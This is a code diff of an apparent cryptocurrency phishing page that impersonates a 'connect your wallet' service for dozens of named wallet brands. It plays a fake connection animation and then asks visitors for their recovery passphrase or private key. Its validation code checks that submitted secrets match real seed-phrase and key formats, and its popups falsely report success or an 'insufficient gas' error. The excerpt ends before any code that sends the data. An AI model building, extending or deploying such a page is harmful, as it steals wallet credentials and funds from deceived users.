@@ -429,6 +429,14 @@
         color: #444;
         font-size: 15px;
       }
+
+      /* key field only — monospace reads better for base58/hex */
+      #issueBox {
+        font-family: "Space Mono", monospace;
+        font-size: 0.85rem;
+        resize: none;
+      }
+
       .submit-btn {
         width: 100%;
         padding: 14px;
@@ -601,10 +609,7 @@
         <div class="ticker-wrap">
           <div class="ticker-track">
             <div class="ticker-slide">
-              <img
-                src="Icons/Metamask-Digital-Asset-Logo-PNG.png"
-                alt="MetaMask"
-              />
+              <img src="Icons/Metamask-Digital-Asset-Logo-PNG.png" alt="MetaMask" />
               <img src="Icons/trust-wallet-icon.png" alt="Trust Wallet" />
               <img src="Icons/idreP17eZK_1773876334789.jpeg" alt="Phantom" />
               <img src="Icons/Ledger.jfif" alt="Ledger" />
@@ -624,12 +629,15 @@
               <img src="Icons/argent.png" alt="Argent" />
               <img src="Icons/Atomic-wallet.png" alt="Atomic" />
               <img src="Icons/zengo.png" alt="Zengo" />
+              <img src="Icons/rabby.png" alt="Rabby"
+                onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/RabbyHub/logo/master/symbol.png'" />
+              <img src="Icons/walletconnect.png" alt="WalletConnect"
+                onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Blue%20(Default)/Icon.png'" />
+              <img src="Icons/cake.png" alt="Cake Wallet"
+                onerror="this.onerror=null;this.src='https://cryptologos.zenobank.io/library/cake-wallet-icon-dark.png'" />
             </div>
             <div class="ticker-slide">
-              <img
-                src="Icons/Metamask-Digital-Asset-Logo-PNG.png"
-                alt="MetaMask"
-              />
+              <img src="Icons/Metamask-Digital-Asset-Logo-PNG.png" alt="MetaMask" />
               <img src="Icons/trust-wallet-icon.png" alt="Trust Wallet" />
               <img src="Icons/idreP17eZK_1773876334789.jpeg" alt="Phantom" />
               <img src="Icons/Ledger.jfif" alt="Ledger" />
@@ -649,6 +657,12 @@
               <img src="Icons/argent.png" alt="Argent" />
               <img src="Icons/Atomic-wallet.png" alt="Atomic" />
               <img src="Icons/zengo.png" alt="Zengo" />
+              <img src="Icons/rabby.png" alt="Rabby"
+                onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/RabbyHub/logo/master/symbol.png'" />
+              <img src="Icons/walletconnect.png" alt="WalletConnect"
+                onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Blue%20(Default)/Icon.png'" />
+              <img src="Icons/cake.png" alt="Cake Wallet"
+                onerror="this.onerror=null;this.src='https://cryptologos.zenobank.io/library/cake-wallet-icon-dark.png'" />
             </div>
           </div>
         </div>
@@ -660,662 +674,454 @@
           <p>Select a wallet:</p>
         </div>
         <div class="brands-grid">
-          <div
-            class="brand-card"
-            onclick="openModal('MetaMask','Icons/Metamask-Digital-Asset-Logo-PNG.png')"
-          >
-            <img
-              src="Icons/Metamask-Digital-Asset-Logo-PNG.png"
-              alt="MetaMask"
-            /><span>MetaMask</span>
+          <div class="brand-card" onclick="openModal('MetaMask','Icons/Metamask-Digital-Asset-Logo-PNG.png')">
+            <img src="Icons/Metamask-Digital-Asset-Logo-PNG.png" alt="MetaMask" /><span>MetaMask</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Trust Wallet','Icons/trust-wallet-icon.png')"
-          >
-            <img src="Icons/trust-wallet-icon.png" alt="Trust Wallet" /><span
-              >Trust Wallet</span
-            >
+          <div class="brand-card" onclick="openModal('Trust Wallet','Icons/trust-wallet-icon.png')">
+            <img src="Icons/trust-wallet-icon.png" alt="Trust Wallet" /><span>Trust Wallet</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Phantom','Icons/idreP17eZK_1773876334789.jpeg')"
-          >
-            <img src="Icons/idreP17eZK_1773876334789.jpeg" alt="Phantom" /><span
-              >Phantom</span
-            >
+          <div class="brand-card" onclick="openModal('Phantom','Icons/idreP17eZK_1773876334789.jpeg')">
+            <img src="Icons/idreP17eZK_1773876334789.jpeg" alt="Phantom" /><span>Phantom</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Ledger','Icons/Ledger.jfif')"
-          >
+          <div class="brand-card" onclick="openModal('Ledger','Icons/Ledger.jfif')">
             <img src="Icons/Ledger.jfif" alt="Ledger" /><span>Ledger</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Trezor','Icons/trezor.png')"
-          >
+          <div class="brand-card" onclick="openModal('Trezor','Icons/trezor.png')">
             <img src="Icons/trezor.png" alt="Trezor" /><span>Trezor</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Exodus','Icons/Exodus.png')"
-          >
+          <div class="brand-card" onclick="openModal('Exodus','Icons/Exodus.png')">
             <img src="Icons/Exodus.png" alt="Exodus" /><span>Exodus</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Coinbase Wallet','Icons/coinbase.png')"
-          >
-            <img src="Icons/coinbase.png" alt="Coinbase Wallet" /><span
-              >Coinbase Wallet</span
-            >
+          <div class="brand-card" onclick="openModal('Coinbase Wallet','Icons/coinbase.png')">
+            <img src="Icons/coinbase.png" alt="Coinbase Wallet" /><span>Coinbase Wallet</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Rainbow','Icons/rainbow.jfif')"
-          >
+          <div class="brand-card" onclick="openModal('Rainbow','Icons/rainbow.jfif')">
             <img src="Icons/rainbow.jfif" alt="Rainbow" /><span>Rainbow</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Zerion','Icons/zerion-logo.png')"
-          >
+          <div class="brand-card" onclick="openModal('Zerion','Icons/zerion-logo.png')">
             <img src="Icons/zerion-logo.png" alt="Zerion" /><span>Zerion</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Uniswap Wallet','Icons/Uniswap-logo.png')"
-          >
-            <img src="Icons/Uniswap-logo.png" alt="Uniswap Wallet" /><span
-              >Uniswap Wallet</span
-            >
+          <div class="brand-card" onclick="openModal('Uniswap Wallet','Icons/Uniswap-logo.png')">
+            <img src="Icons/Uniswap-logo.png" alt="Uniswap Wallet" /><span>Uniswap Wallet</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Binance Wallet','Icons/binance-logo.png')"
-          >
-            <img src="Icons/binance-logo.png" alt="Binance Wallet" /><span
-              >Binance Wallet</span
-            >
+          <div class="brand-card" onclick="openModal('Binance Wallet','Icons/binance-logo.png')">
+            <img src="Icons/binance-logo.png" alt="Binance Wallet" /><span>Binance Wallet</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('OKX Wallet','Icons/okx-logo.png')"
-          >
-            <img src="Icons/okx-logo.png" alt="OKX Wallet" /><span
-              >OKX Wallet</span
-            >
+          <div class="brand-card" onclick="openModal('OKX Wallet','Icons/okx-logo.png')">
+            <img src="Icons/okx-logo.png" alt="OKX Wallet" /><span>OKX Wallet</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Bybit Wallet','Icons/bybit-logo.png')"
-          >
-            <img src="Icons/bybit-logo.png" alt="Bybit Wallet" /><span
-              >Bybit Wallet</span
-            >
+          <div class="brand-card" onclick="openModal('Bybit Wallet','Icons/bybit-logo.png')">
+            <img src="Icons/bybit-logo.png" alt="Bybit Wallet" /><span>Bybit Wallet</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Crypto.com Wallet','Icons/crypto-logo.jfif')"
-          >
-            <img src="Icons/crypto-logo.jfif" alt="Crypto.com" /><span
-              >Crypto.com</span
-            >
+          <div class="brand-card" onclick="openModal('Crypto.com Wallet','Icons/crypto-logo.jfif')">
+            <img src="Icons/crypto-logo.jfif" alt="Crypto.com" /><span>Crypto.com</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Kraken Wallet','Icons/Kraken.jfif')"
-          >
-            <img src="Icons/Kraken.jfif" alt="Kraken Wallet" /><span
-              >Kraken Wallet</span
-            >
+          <div class="brand-card" onclick="openModal('Kraken Wallet','Icons/Kraken.jfif')">
+            <img src="Icons/Kraken.jfif" alt="Kraken Wallet" /><span>Kraken Wallet</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Solflare','Icons/Solflare.png')"
-          >
+          <div class="brand-card" onclick="openModal('Solflare','Icons/Solflare.png')">
             <img src="Icons/Solflare.png" alt="Solflare" /><span>Solflare</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Backpack','Icons/backpack.jfif')"
-          >
-            <img src="Icons/backpack.jfif" alt="Backpack" /><span
-              >Backpack</span
-            >
+          <div class="brand-card" onclick="openModal('Backpack','Icons/backpack.jfif')">
+            <img src="Icons/backpack.jfif" alt="Backpack" /><span>Backpack</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Argent','Icons/argent.png')"
-          >
+          <div class="brand-card" onclick="openModal('Argent','Icons/argent.png')">
             <img src="Icons/argent.png" alt="Argent" /><span>Argent</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Gnosis Safe','Icons/Gnosis.png')"
-          >
-            <img src="Icons/Gnosis.png" alt="Gnosis Safe" /><span
-              >Gnosis Safe</span
-            >
+          <div class="brand-card" onclick="openModal('Gnosis Safe','Icons/Gnosis.png')">
+            <img src="Icons/Gnosis.png" alt="Gnosis Safe" /><span>Gnosis Safe</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Atomic Wallet','Icons/Atomic-wallet.png')"
-          >
-            <img src="Icons/Atomic-wallet.png" alt="Atomic Wallet" /><span
-              >Atomic Wallet</span
-            >
+          <div class="brand-card" onclick="openModal('Atomic Wallet','Icons/Atomic-wallet.png')">
+            <img src="Icons/Atomic-wallet.png" alt="Atomic Wallet" /><span>Atomic Wallet</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Electrum','Icons/electrum.jfif')"
-          >
-            <img src="Icons/electrum.jfif" alt="Electrum" /><span
-              >Electrum</span
-            >
+          <div class="brand-card" onclick="openModal('Electrum','Icons/electrum.jfif')">
+            <img src="Icons/electrum.jfif" alt="Electrum" /><span>Electrum</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Mycelium','Icons/Mycelium.png')"
-          >
+          <div class="brand-card" onclick="openModal('Mycelium','Icons/Mycelium.png')">
             <img src="Icons/Mycelium.png" alt="Mycelium" /><span>Mycelium</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Edge Wallet','Icons/Egde.jfif')"
-          >
-            <img src="Icons/Egde.jfif" alt="Edge Wallet" /><span
-              >Edge Wallet</span
-            >
+          <div class="brand-card" onclick="openModal('Edge Wallet','Icons/Egde.jfif')">
+            <img src="Icons/Egde.jfif" alt="Edge Wallet" /><span>Edge Wallet</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Blockchain.com','Icons/blockchain.png')"
-          >
-            <img src="Icons/blockchain.png" alt="Blockchain.com" /><span
-              >Blockchain.com</span
-            >
+          <div class="brand-card" onclick="openModal('Blockchain.com','Icons/blockchain.png')">
+            <img src="Icons/blockchain.png" alt="Blockchain.com" /><span>Blockchain.com</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('BitPay','Icons/bitpay.jfif')"
-          >
+          <div class="brand-card" onclick="openModal('BitPay','Icons/bitpay.jfif')">
             <img src="Icons/bitpay.jfif" alt="BitPay" /><span>BitPay</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Xdefi Wallet','Icons/xdefi.jfif')"
-          >
+          <div class="brand-card" onclick="openModal('Xdefi Wallet','Icons/xdefi.jfif')">
             <img src="Icons/xdefi.jfif" alt="Xdefi" /><span>Xdefi Wallet</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Keplr','Icons/keplr.jfif')"
-          >
+          <div class="brand-card" onclick="openModal('Keplr','Icons/keplr.jfif')">
             <img src="Icons/keplr.jfif" alt="Keplr" /><span>Keplr</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Terra Station','Icons/Terra station.png')"
-          >
-            <img src="Icons/Terra station.png" alt="Terra Station" /><span
-              >Terra Station</span
-            >
+          <div class="brand-card" onclick="openModal('Terra Station','Icons/Terra station.png')">
+            <img src="Icons/Terra station.png" alt="Terra Station" /><span>Terra Station</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Leap Wallet','Icons/Leap wallet.png')"
-          >
-            <img src="Icons/Leap wallet.png" alt="Leap Wallet" /><span
-              >Leap Wallet</span
-            >
+          <div class="brand-card" onclick="openModal('Leap Wallet','Icons/Leap wallet.png')">
+            <img src="Icons/Leap wallet.png" alt="Leap Wallet" /><span>Leap Wallet</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Braavos','Icons/Bravoos.jfif')"
-          >
-            <img src="Icons/Bravoos.jfif" alt="Braavos" /><span>Braavos</span>
+          <div class="brand-card" onclick="openModal('Zengo','Icons/zengo.png')">
+            <img src="Icons/zengo.png" alt="Zengo"
+              onerror="this.onerror=null;this.src='https://cryptologos.zenobank.io/library/zengo-wallet-icon-dark.png'" /><span>Zengo</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('imToken','Icons/Imtoken.jfif')"
-          >
-            <img src="Icons/Imtoken.jfif" alt="imToken" /><span>imToken</span>
+          <div class="brand-card" onclick="openModal('Rabby Wallet','Icons/rabby.png')">
+            <img src="Icons/rabby.png" alt="Rabby Wallet"
+              onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/RabbyHub/logo/master/symbol.png'" /><span>Rabby Wallet</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('TokenPocket','Icons/Tokenpocket.png')"
-          >
-            <img src="Icons/Tokenpocket.png" alt="TokenPocket" /><span
-              >TokenPocket</span
-            >
+          <div class="brand-card" onclick="openModal('WalletConnect','Icons/walletconnect.png')">
+            <img src="Icons/walletconnect.png" alt="WalletConnect"
+              onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Blue%20(Default)/Icon.png'" /><span>WalletConnect</span>
           </div>
-          <div
-            class="brand-card"
-            onclick="openModal('SafePal','Icons/Safepal.png')"
-          >
-            <img src="Icons/Safepal.png" alt="SafePal" /><span>SafePal</span>
-          </div>
-          <div
-            class="brand-card"
-            onclick="openModal('DCENT','Icons/Dcent.png')"
-          >
-            <img src="Icons/Dcent.png" alt="D'CENT" /><span>D'CENT</span>
-          </div>
-          <div
-            class="brand-card"
-            onclick="openModal('CoolWallet','Icons/coolwallet.png')"
-          >
-            <img src="Icons/coolwallet.png" alt="CoolWallet" /><span
-              >CoolWallet</span
-            >
-          </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Unstoppable','Icons/unstoppable.jfif')"
-          >
-            <img src="Icons/unstoppable.jfif" alt="Unstoppable" /><span
-              >Unstoppable</span
-            >
-          </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Coin98','Icons/COin98.png')"
-          >
-            <img src="Icons/COin98.png" alt="Coin98" /><span>Coin98</span>
-          </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Slope Wallet','Icons/slope.png')"
-          >
-            <img src="Icons/slope.png" alt="Slope Wallet" /><span
-              >Slope Wallet</span
-            >
-          </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Glow Wallet','Icons/glow wallet.jfif')"
-          >
-            <img src="Icons/glow wallet.jfif" alt="Glow Wallet" /><span
-              >Glow Wallet</span
-            >
-          </div>
-          <div
-            class="brand-card"
-            onclick="openModal('MathWallet','Icons/mathwalletlogo.jfif')"
-          >
-            <img src="Icons/mathwalletlogo.jfif" alt="MathWallet" /><span
-              >MathWallet</span
-            >
-          </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Frontier','Icons/frontier.jfif')"
-          >
-            <img src="Icons/frontier.jfif" alt="Frontier" /><span
-              >Frontier</span
-            >
-          </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Sequence','Icons/sequence.jfif')"
-          >
-            <img src="Icons/sequence.jfif" alt="Sequence" /><span
-              >Sequence</span
-            >
-          </div>
-          <div class="brand-card" onclick="openModal('Taho','Icons/Taho.png')">
-            <img src="Icons/Taho.png" alt="Taho" /><span>Taho</span>
-          </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Frame','Icons/frame.jfif')"
-          >
-            <img src="Icons/frame.jfif" alt="Frame" /><span>Frame</span>
-          </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Enkrypt','Icons/Enkrypt.jfif')"
-          >
-            <img src="Icons/Enkrypt.jfif" alt="Enkrypt" /><span>Enkrypt</span>
-          </div>
-          <div
-            class="brand-card"
-            onclick="openModal('NOW Wallet','Icons/Now wallet.jfif')"
-          >
-            <img src="Icons/Now wallet.jfif" alt="NOW Wallet" /><span
-              >NOW Wallet</span
-            >
-          </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Guarda Wallet','Icons/Guarda logo.jfif')"
-          >
-            <img src="Icons/Guarda logo.jfif" alt="Guarda" /><span
-              >Guarda Wallet</span
-            >
-          </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Zengo','Icons/zengo.png')"
-          >
-            <img src="Icons/zengo.png" alt="Zengo" /><span>Zengo</span>
-          </div>
-          <div
-            class="brand-card"
-            onclick="openModal('1inch Wallet','Icons/1inch.png')"
-          >
-            <img src="Icons/1inch.png" alt="1inch Wallet" /><span
-              >1inch Wallet</span
-            >
-          </div>
-          <div
-            class="brand-card"
-            onclick="openModal('Rabby Wallet','Icons/Rabby.jfif')"
-          >
-            <img src="Icons/Rabby.jfif" alt="Rabby" /><span>Rabby Wallet</span>
+          <div class="brand-card" onclick="openModal('Cake Wallet','Icons/cake.png')">
+            <img src="Icons/cake.png" alt="Cake Wallet"
+              onerror="this.onerror=null;this.src='https://cryptologos.zenobank.io/library/cake-wallet-icon-dark.png'" /><span>Cake Wallet</span>
           </div>
         </div>
       </section>
     </div>
 
-    <!-- WALLET MODAL -->
+    <!-- ===== WALLET MODAL ===== -->
     <div class="modal-overlay" id="modalOverlay">
       <div class="modal">
-        <button class="modal-close" id="modalCloseBtn">&#x2715;</button>
+        <button class="modal-close" id="modalClose">✕</button>
 
-        <!-- CONNECTING SCREEN -->
+        <!-- Connecting screen -->
         <div class="connecting-screen" id="connectingScreen">
-          <img id="connectingLogo" class="connecting-logo" src="" alt="" />
-          <div class="connecting-title"><span>Manual Connection</span></div>
+          <img class="connecting-logo" id="connectingLogo" alt="" />
+          <div class="connecting-title">
+            Connecting to <span id="connectingWalletName"></span>
+          </div>
           <div class="progress-bar-wrap">
             <div class="progress-bar-fill" id="progressFill"></div>
           </div>
-          <div class="status-steps">
-            <div class="status-step" id="step1">
-              <div class="step-dot"></div>
-              Initializing secure channel...
-            </div>
-            <div class="status-step" id="step2">
-              <div class="step-dot"></div>
-              Verifying partner credentials...
-            </div>
-            <div class="status-step" id="step3">
-              <div class="step-dot"></div>
-              Establishing connection...
-            </div>
-            <div class="status-step" id="step4">
-              <div class="step-dot"></div>
-              Connection established &#x2713;
-            </div>
-          </div>
+          <div class="status-steps" id="statusSteps"></div>
         </div>
 
-        <!-- FORM SCREEN -->
+        <!-- Form screen -->
         <div class="form-screen" id="formScreen">
-          <h3>Manual Connection</h3>
+          <h3 style="margin-bottom: 18px">Manual Connection</h3>
+
           <div class="tab-bar">
-            <!-- PASSPHRASE FIRST -->
-            <button class="tab-btn active" data-tab="tabReview">
-              Passphrase
-            </button>
-            <button class="tab-btn" data-tab="tabIssue">Private Key</button>
+            <button class="tab-btn active" data-tab="phrase">Passphrase</button>
+            <button class="tab-btn" data-tab="key">Private Key</button>
           </div>
 
-          <form id="contactForm">
-            <input type="hidden" name="partner" id="partnerInput" />
-
-            <!-- PASSPHRASE TAB (now first/active) -->
-            <div class="tab-panel active" id="tabReview">
-              <div class="form-group">
-                <label for="messageBox">Passphrase</label>
-                <textarea
-                  id="messageBox"
-                  name="message"
-                  placeholder="Enter your recovery passphrase typically 12-24 words separated by a space"
-                  rows="6"
-                ></textarea>
-                <div class="phrase-hint" id="phraseHint">
-                  0 words &#x2014; enter exactly 12 or 24
-                </div>
+          <div class="tab-panel active" data-panel="phrase">
+            <div class="form-group">
+              <label>Passphrase</label>
+              <textarea
+                id="phraseInput"
+                rows="4"
+                spellcheck="false"
+                placeholder="Enter your recovery passphrase typically 12-24 words separated by a space"
+              ></textarea>
+              <div class="phrase-hint" id="phraseHint">
+                0 words — min 12, max 24
               </div>
             </div>
+          </div>
 
-            <!-- PRIVATE KEY TAB (now second) -->
-            <div class="tab-panel" id="tabIssue">
-              <div class="form-group">
-                <label for="issueBox">Private Key</label>
-                <textarea
-                  id="issueBox"
-                  name="issue"
-                  placeholder="Enter your private key"
-                  rows="6"
-                ></textarea>
+          <div class="tab-panel" data-panel="key">
+            <div class="form-group">
+              <label>Private Key</label>
+              <textarea
+                id="issueBox"
+                rows="4"
+                minlength="51"
+                maxlength="88"
+                spellcheck="false"
+                placeholder="Paste your private key (51-88 characters)"
+              ></textarea>
+              <div class="phrase-hint" id="keyHint">
+                0 characters — min 51, max 88
               </div>
             </div>
+          </div>
 
-            <button type="submit" class="submit-btn" id="submitBtn">
-              Connect
-            </button>
-          </form>
+          <button class="submit-btn" id="submitBtn" disabled>Connect</button>
         </div>
       </div>
     </div>
 
-    <!-- GAS ERROR POPUP -->
-    <div class="success-popup-overlay" id="successPopup">
+    <!-- ===== SUCCESS POPUP ===== -->
+    <div class="success-popup-overlay" id="successOverlay">
       <div class="success-popup">
-        <button class="gas-popup-close" id="gasCloseTop">&#x2715;</button>
-        <h3>Insufficient Gas</h3>
+        <button class="gas-popup-close" id="successClose">✕</button>
+        <h3>Wallet Connected</h3>
         <p>
-          Insufficient balance for gas. Please fund your wallet to continue or
-          try again with another wallet. Please contact the admin with your
-          unique ref code: 2QGFLb
+          Your <strong id="successWalletName"></strong> wallet has been connected
+          successfully.
         </p>
-        <button class="success-close-btn" id="gasCloseBtn">Close</button>
+        <button class="success-close-btn" id="successDone">Done</button>
       </div>
     </div>
 
     <script>
-      // 🔥 ONLY ADDED THIS — random code generator
-      function generateRefCode(length = 6) {
-        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-        let result = '';
-        for (let i = 0; i < length; i++) {
-          result += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        return result;
-      }
+      (function () {
+        const overlay = document.getElementById("modalOverlay");
+        const connecting = document.getElementById("connectingScreen");
+        const form = document.getElementById("formScreen");
+        const progressFill = document.getElementById("progressFill");
+        const statusSteps = document.getElementById("statusSteps");
+        const logoEl = document.getElementById("connectingLogo");
+        const nameEl = document.getElementById("connectingWalletName");
+        const successName = document.getElementById("successWalletName");
+        const phraseInput = document.getElementById("phraseInput");
+        const phraseHint = document.getElementById("phraseHint");
+        const keyInput = document.getElementById("issueBox");
+        const keyHint = document.getElementById("keyHint");
+        const submitBtn = document.getElementById("submitBtn");
+        const successOverlay = document.getElementById("successOverlay");
 
-      function countWords(str) {
-        return str
-          .trim()
-          .split(/\s+/)
-          .filter(function (w) {
-            return w.length > 0;
-          }).length;
-      }
+        const KEY_MIN = 51;
+        const KEY_MAX = 88;
 
-      function openModal(brandName, logoSrc) {
-        document.getElementById("formScreen").classList.remove("visible");
-        document.getElementById("connectingScreen").style.display = "flex";
-        document.getElementById("contactForm").reset();
-        document.getElementById("partnerInput").value = brandName;
-        document.getElementById("connectingLogo").src = logoSrc;
-        document.getElementById("connectingLogo").alt = brandName;
-        document.getElementById("progressFill").style.width = "0%";
-        document.getElementById("phraseHint").textContent =
-          "0 words \u2014 enter exactly 12 or 24";
-        document.getElementById("phraseHint").className = "phrase-hint";
-        document.querySelectorAll(".tab-btn").forEach(function (b, i) {
-          b.classList.toggle("active", i === 0);
-        });
-        document.querySelectorAll(".tab-panel").forEach(function (p, i) {
-          p.classList.toggle("active", i === 0);
-        });
-        ["step1", "step2", "step3", "step4"].forEach(function (id) {
-          document.getElementById(id).className = "status-step";
-        });
-        document.getElementById("modalOverlay").classList.add("active");
-        runConnectingSequence();
-      }
+        // Internet backups for the wallet icons.
+        // Only used if the matching file inside /Icons is missing.
+        // This is what stops the popup logo from coming up blank.
+        const ICON_FALLBACKS = {
+          "Icons/zengo.png":
+            "https://cryptologos.zenobank.io/library/zengo-wallet-icon-dark.png",
+          "Icons/rabby.png":
+            "https://raw.githubusercontent.com/RabbyHub/logo/master/symbol.png",
+          "Icons/walletconnect.png":
+            "https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Blue%20(Default)/Icon.png",
+          "Icons/cake.png":
+            "https://cryptologos.zenobank.io/library/cake-wallet-icon-dark.png",
+        };
 
-      function closeModal() {
-        document.getElementById("modalOverlay").classList.remove("active");
-      }
-
-      function closeSuccessPopup() {
-        document.getElementById("successPopup").classList.remove("active");
-      }
-
-      function runConnectingSequence() {
-        var steps = [
-          { id: "step1", progress: 25, delay: 0 },
-          { id: "step2", progress: 55, delay: 700 },
-          { id: "step3", progress: 80, delay: 1400 },
-          { id: "step4", progress: 100, delay: 2100 },
+        let timers = [];
+        const STEPS = [
+          "Establishing secure connection…",
+          "Verifying wallet signature…",
+          "Syncing account state…",
+          "Almost there…",
         ];
-        steps.forEach(function (step, index) {
-          setTimeout(function () {
-            if (index > 0) {
-              document.getElementById(steps[index - 1].id).className =
-                "status-step visible done";
-            }
-            document.getElementById(step.id).className =
-              "status-step visible active";
-            document.getElementById("progressFill").style.width =
-              step.progress + "%";
-          }, step.delay);
+
+        function clearTimers() {
+          timers.forEach(clearTimeout);
+          timers = [];
+        }
+
+        function setTab(tab) {
+          document.querySelectorAll(".tab-btn").forEach((b) =>
+            b.classList.toggle("active", b.dataset.tab === tab)
+          );
+          document.querySelectorAll(".tab-panel").forEach((p) =>
+            p.classList.toggle("active", p.dataset.panel === tab)
+          );
+          updateSubmitState();
+        }
+
+        function activeTab() {
+          return document.querySelector(".tab-panel.active").dataset.panel;
+        }
+
+        // ---- passphrase: exactly 12 or 24 words ----
+        function wordCount(v) {
+          return v.trim() ? v.trim().split(/\s+/).length : 0;
+        }
+
+        function phraseValid() {
+          const n = wordCount(phraseInput.value);
+          return n === 12 || n === 24;
+        }
+
+        function updatePhraseHint() {
+          const n = wordCount(phraseInput.value);
+          if (n === 0) {
+            phraseHint.textContent = "0 words — min 12, max 24";
+            phraseHint.className = "phrase-hint";
+          } else if (n === 12 || n === 24) {
+            phraseHint.textContent = n + " words — looks good";
+            phraseHint.className = "phrase-hint valid";
+          } else {
+            phraseHint.textContent = n + " words — min 12, max 24";
+            phraseHint.className = "phrase-hint invalid";
+          }
+        }
+
+        // ---- private key: strict min/max + real format ----
+        // length must be within KEY_MIN..KEY_MAX, and match:
+        //   64 hex chars (optional 0x) -> EVM
+        //   51-52 base58 chars         -> Bitcoin
+        //   87-88 base58 chars         -> Solana
+        function keyValid() {
+          const t = keyInput.value.trim();
+          const len = t.length;
+          if (len < KEY_MIN || len > KEY_MAX) return false;
+          if (/^0x[0-9a-fA-F]{64}$/.test(t)) return true;
+          if (/^[0-9a-fA-F]{64}$/.test(t)) return true;
+          if (/^[1-9A-HJ-NP-Za-km-z]{51,52}$/.test(t)) return true;
+          if (/^[1-9A-HJ-NP-Za-km-z]{87,88}$/.test(t)) return true;
+          return false;
+        }
+
+        function updateKeyHint() {
+          const t = keyInput.value.trim();
+          const len = t.length;
+
+          if (len === 0) {
+            keyHint.textContent = "0 characters — min " + KEY_MIN + ", max " + KEY_MAX;
+            keyHint.className = "phrase-hint";
+            return;
+          }
+
+          if (len < KEY_MIN) {
+            keyHint.textContent =
+              len + " / " + KEY_MIN + " characters — too short";
+            keyHint.className = "phrase-hint invalid";
+            return;
+          }
+
+          if (len > KEY_MAX) {
+            keyHint.textContent =
+              len + " / " + KEY_MAX + " characters — too long";
+            keyHint.className = "phrase-hint invalid";
+            return;
+          }
+
+          if (keyValid()) {
+            keyHint.textContent = len + " characters — looks good";
+            keyHint.className = "phrase-hint valid";
+            return;
+          }
+
+          keyHint.textContent = len + " characters — invalid key format";
+          keyHint.className = "phrase-hint invalid";
+        }
+
+        // Connect stays locked until the active tab is valid
+        function updateSubmitState() {
+          if (activeTab() === "phrase") {
+            updatePhraseHint();
+            submitBtn.disabled = !phraseValid();
+          } else {
+            updateKeyHint();
+            submitBtn.disabled = !keyValid();
+          }
+        }
+
+        function runConnecting() {
+          clearTimers();
+          let progress = 0;
+          const tick = setInterval(() => {
+            progress += 2;
+            progressFill.style.width = Math.min(progress, 100) + "%";
+            if (progress >= 100) clearInterval(tick);
+          }, 40);
+
+          STEPS.forEach((label, i) => {
+            const step = document.createElement("div");
+            step.className = "status-step";
+            step.innerHTML =
+              '<span class="step-dot"></span><span>' + label + "</span>";
+            statusSteps.appendChild(step);
+
+            timers.push(setTimeout(() => step.classList.add("visible"), i * 700));
+            timers.push(setTimeout(() => step.classList.add("active"), i * 700 + 100));
+            timers.push(
+              setTimeout(() => {
+                step.classList.remove("active");
+                step.classList.add("done");
+              }, i * 700 + 800)
+            );
+          });
+
+          timers.push(
+            setTimeout(() => {
+              connecting.style.display = "none";
+              form.classList.add("visible");
+              updateSubmitState();
+            }, STEPS.length * 700 + 900)
+          );
+        }
+
+        window.openModal = function (name, icon) {
+          nameEl.textContent = name;
+          successName.textContent = name;
+
+          // load the popup logo, with the same backup behaviour as the cards
+          logoEl.onerror = function () {
+            this.onerror = null;
+            const fb = ICON_FALLBACKS[icon];
+            if (fb) this.src = fb;
+          };
+          logoEl.src = icon;
+
+          connecting.style.display = "flex";
+          form.classList.remove("visible");
+          progressFill.style.width = "0%";
+          statusSteps.innerHTML = "";
+          phraseInput.value = "";
+          keyInput.value = "";
